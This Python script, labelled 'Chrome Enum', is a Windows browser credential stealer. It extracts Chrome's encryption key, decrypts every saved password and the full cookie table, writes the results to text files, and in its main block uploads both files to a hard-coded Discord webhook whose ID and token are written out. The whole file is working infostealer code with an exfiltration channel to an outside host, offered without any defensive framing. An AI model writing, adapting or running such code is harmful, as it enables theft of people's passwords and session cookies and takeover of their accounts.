
import base64
import json
import os
import random
import shutil
import sqlite3
import string
import sys
import discord
import requests

from time import sleep
import win32crypt
from Cryptodome.Cipher import AES


class Chrome:
    def __init__(self):
        self.version = 'V1.1'
        self.base_dir = os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\')
        if not os.path.exists(self.base_dir):
            raise FileNotFoundError('Unable to find Google Chrome\'s User Data folder.')
        self.key = self.__key_extract()

    def __key_extract(self) -> bytes:
        """Extracts AES key for the new crypto method introduced in Google Chrome V80."""
        with open(os.path.join(self.base_dir + 'Local State'), 'rb') as key_file_raw:
            key_file_json = json.loads(key_file_raw.read())
        key_base64 = key_file_json["os_crypt"]["encrypted_key"]
        key_protected = base64.b64decode(key_base64)[5:]  # [5:] removes header
        return win32crypt.CryptUnprotectData(key_protected, None, None, None, 0)[1]  # Removing Windows' key protection

    @staticmethod
    def __decrypter_old(data: bytes) -> bytes:
        """Decrypts Google Chrome data encrypted with the old method before V80.
        :param data: Encrypted data
        :return: Decrypted data
        """
        try:
            return win32crypt.CryptUnprotectData(data, None, None, None, 0)[1]
        except Exception as ex:
            print("Decryption failed. Encrypted data: ", file=sys.stderr)
            print(data, file=sys.stderr)
            print("Exception: ", file=sys.stderr)
            print(ex, file=sys.stderr)

    def __decrypter_aes(self, data: bytes) -> bytes:
        """Decrypts Google Chrome data encrypted with the new AES method introduced in V80.
        :param data: Encrypted data
        :return: Decrypted data
        """
        iv = data[3:15]  # The first three characters declare that this is "v10", meaning the new AES crypto.
        cipher = AES.new(self.key, AES.MODE_GCM, iv)
        try:
            return cipher.decrypt(data[15:])[:-16]  # Last 16 characters are extraneous, therefore removed
        except Exception as ex:
            print("Decryption failed. Encrypted data: ", file=sys.stderr)
            print(data, file=sys.stderr)
            print("Exception: ", file=sys.stderr)
            print(ex, file=sys.stderr)

    def __decrypter(self, data: bytes) -> bytes:
        """Determines cryptography method and returns decrypted text; raises ValueError if crypto is unrecognized.
        :param data: Encrypted data; cookies and passwords are encrypted by default.
        :return: Decrypted data.
        """
        if data[:3] == b'v10':
            return self.__decrypter_aes(data)
        elif data[:4] == b'\x01\0\0\0':
            return self.__decrypter_old(data)
        else:
            raise ValueError("Decryption type unknown. Please report this error. Encrypted data: " + str(data))

    def password(self) -> list:
        """Extracts and decrypts passwords saved in Google Chrome.
        :return: A list of lists of password entries. Each entry contains the URL, username and password, respectively.
        """
        filename = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        shutil.copy2(os.path.join(self.base_dir, 'default', 'Login Data'), filename)  # Copying to avoid lock issues
        database = sqlite3.connect(filename)
        cursor = database.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        password_database = list()
        for row in cursor.fetchall():
            password_database.append([row[0], row[1], self.__decrypter(row[2])])
        database.close()
        try:
            os.remove(filename)
        except Exception as ex:
            if os.path.exists(filename):
                print(ex, file=sys.stderr)
        return password_database

    def cookies(self) -> list:
        """Extracts and decrypts cookies saved in Google Chrome.
        The cookies table in Chrome is created as such:
        CREATE TABLE cookies(
            creation_utc INTEGER NOT NULL,
            host_key TEXT NOT NULL,
            name TEXT NOT NULL,
            value TEXT NOT NULL,
            path TEXT NOT NULL,
            expires_utc INTEGER NOT NULL,
            is_secure INTEGER NOT NULL,
            is_httponly INTEGER NOT NULL,
            last_access_utc INTEGER NOT NULL,
            has_expires INTEGER NOT NULL DEFAULT 1,
            is_persistent INTEGER NOT NULL DEFAULT 1,
            priority INTEGER NOT NULL DEFAULT 1,
            encrypted_value BLOB DEFAULT '',
            samesite INTEGER NOT NULL DEFAULT -1,
            source_scheme INTEGER NOT NULL DEFAULT 0,
            UNIQUE (host_key, name, path)
        )
        The returned list contains the entire database, except encrypted_value is decrypted.
        :return:  A list of lists of cookie entries. All cookie database columns are included per cookie entry.
        """
        filename = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        shutil.copy2(os.path.join(self.base_dir, 'default', 'Cookies'), filename)  # Copying to avoid lock issues
        database = sqlite3.connect(filename)
        cursor = database.cursor()
        cursor.execute("SELECT * FROM cookies")
        decrypted_database = list()
        for row in cursor.fetchall():
            decrypted_row = list()
            for element in row:
                if type(element) is bytes:
                    decrypted_row.append(self.__decrypter(element))
                else:
                    decrypted_row.append(element)
            decrypted_database.append(decrypted_row)
        database.close()
        try:
            os.remove(filename)
        except Exception as ex:
            if os.path.exists(filename):
                print(ex, file=sys.stderr)
        return decrypted_database


if __name__ == "__main__":
    c = Chrome()
    print("Chrome Enum " + c.version)
    print("Dumping passwords...")
    passwords = c.password()
    myfile1 = open('ps.txt', 'w')
    webhook = discord.Webhook.partial(882973718899490876, 'wwLTC4RX5_dPjaYgCFJ34XHEUsuyJiiEQ9OHW3I5gfLUmH6tjVmnyfA9oKIPqDmIzYCH', adapter=discord.RequestsWebhookAdapter()) # Your webhook
    for password in passwords:
        print(password)
        myfile1.write("%s\n" % password)
    sleep(1)
    with open(file='ps.txt', mode='rb') as f:
        my_file22 = discord.File(f)
    webhook.send('message', username='webhook', file=my_file22)


    print("\nDumping cookies...")
    cookies = c.cookies()
    myfile2 = open('ck.txt', 'w')
    for cookie in cookies:
        print(cookie)
        myfile2.write("%s\n" % cookie)
    with open(file='ck.txt', mode='rb') as f:
        my_file2 = discord.File(f)
    webhook.send('message', username='webhook', file=my_file2)
